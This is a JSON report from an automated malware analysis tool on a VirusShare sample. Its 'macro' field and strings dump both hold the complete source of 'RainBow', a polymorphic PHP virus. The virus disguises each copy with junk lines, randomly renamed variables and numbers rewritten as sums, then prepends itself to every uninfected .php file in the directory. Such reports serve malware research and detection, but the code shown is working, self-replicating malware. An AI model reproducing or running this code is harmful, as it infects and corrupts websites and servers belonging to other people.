{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "chr": "May attempt to obfuscate specific str"
        },
        "macro": "<?php // RainBow\nsrand((double)microtime()*1000000);\n $changevars=array('changevars','string','newcont','curdir','filea','victim','viccont','newvars','returnvar','counti','countj','trash','allcont','number','remn');\n $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));\n $newcont='<?php // RainBow'.chr(13).chr(10);\nwhile ($string && $string!='?>'){\nif(rand(0,1)){\nif(rand(0,1)){$newcont.='// '.trash('',0).chr(13).chr(10);}\nif(rand(0,1)){$newcont.='$'.trash('',0).'='.chr(39).trash('',0).chr(39).';'.chr(13).chr(10);}\nif(rand(0,1)){$newcont.='$'.trash('',0).'='.rand().';'.chr(13).chr(10);}}\n $string=strtok(chr(13).chr(10));\nif($string{0}!='/' && $string{0}!='$'){$newcont.=$string.chr(13).chr(10);}}\n $counti=0;\nwhile($changevars[$counti]){\n $newcont=str_replace($changevars[$counti++],trash('',0),$newcont);}\n $countj=-1; $number='';\nwhile(++$countj<strlen($newcont)){\nif (ord($newcont{$countj})>47&&ord($newcont{$countj})<58){\n $number=$newcont{$countj};\nwhile(ord($newcont{++$countj})>47&&ord($newcont{$countj})<58){$number.=$newcont{$countj};}\n $remn=rand(1,10);\nif (!rand(0,5)){switch(rand(1,3)){case 1:$allcont.='('.($number-$remn).'+'.$remn.')';break;\ncase 2:$allcont.='('.($number+$remn).'-'.$remn.')';break;\ncase 3:$allcont.='('.($number*$remn).'/'.$remn.')';break;}}else{$allcont.=$number;}}\n $allcont.=$newcont{$countj};$number='';}\n $curdir=opendir('.');\nwhile($filea=readdir($curdir)){\nif(strstr($filea,'.php')){$victim=fopen($filea,'r+');\nif (!strstr(fread($victim, 25),'RainBow')){rewind($victim);\n $viccont=fread($victim,filesize($filea));\nrewind($victim);\nfwrite($victim,$allcont.$viccont);}\nfclose($victim);}}\nclosedir($curdir);\nfunction trash($returnvar, $countj){\ndo{$returnvar.=chr(rand(97,122));}while($countj++<rand(5,15));\nreturn $returnvar;}\n?>"
    },
    "filename": "VirusShare_f9b2831a882b1f07f853e96310a9dcb0",
    "filesize": 1836,
    "filetype": "PHP script, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "f9b2831a882b1f07f853e96310a9dcb0",
        "sha1": "7b8f8940869a305dd043821943d5ef1e8eb5093c",
        "sha256": "7a878ea7457c010342fbafa226a44de0cf4f193f526d0154f7ad88c29d77589d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php // RainBow",
            "srand((double)microtime()*1000000);",
            " $changevars=array('changevars','string','newcont','curdir','filea','victim','viccont','newvars','returnvar','counti','countj','trash','allcont','number','remn');",
            " $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));",
            " $newcont='<?php // RainBow'.chr(13).chr(10);",
            "while ($string && $string!='?>'){",
            "if(rand(0,1)){",
            "if(rand(0,1)){$newcont.='// '.trash('',0).chr(13).chr(10);}",
            "if(rand(0,1)){$newcont.='$'.trash('',0).'='.chr(39).trash('',0).chr(39).';'.chr(13).chr(10);}",
            "if(rand(0,1)){$newcont.='$'.trash('',0).'='.rand().';'.chr(13).chr(10);}}",
            " $string=strtok(chr(13).chr(10));",
            "if($string{0}!='/' && $string{0}!='$'){$newcont.=$string.chr(13).chr(10);}}",
            " $counti=0;",
            "while($changevars[$counti]){",
            " $newcont=str_replace($changevars[$counti++],trash('',0),$newcont);}",
            " $countj=-1; $number='';",
            "while(++$countj<strlen($newcont)){",
            "if (ord($newcont{$countj})>47&&ord($newcont{$countj})<58){",
            " $number=$newcont{$countj};",
            "while(ord($newcont{++$countj})>47&&ord($newcont{$countj})<58){$number.=$newcont{$countj};}",
            " $remn=rand(1,10);",
            "if (!rand(0,5)){switch(rand(1,3)){case 1:$allcont.='('.($number-$remn).'+'.$remn.')';break;",
            "case 2:$allcont.='('.($number+$remn).'-'.$remn.')';break;",
            "case 3:$allcont.='('.($number*$remn).'/'.$remn.')';break;}}else{$allcont.=$number;}}",
            " $allcont.=$newcont{$countj};$number='';}",
            " $curdir=opendir('.');",
            "while($filea=readdir($curdir)){",
            "if(strstr($filea,'.php')){$victim=fopen($filea,'r+');",
            "if (!strstr(fread($victim, 25),'RainBow')){rewind($victim);",
            " $viccont=fread($victim,filesize($filea));",
            "rewind($victim);",
            "fwrite($victim,$allcont.$viccont);}",
            "fclose($victim);}}",
            "closedir($curdir);",
            "function trash($returnvar, $countj){",
            "do{$returnvar.=chr(rand(97,122));}while($countj++<rand(5,15));",
            "return $returnvar;}"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.254371",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
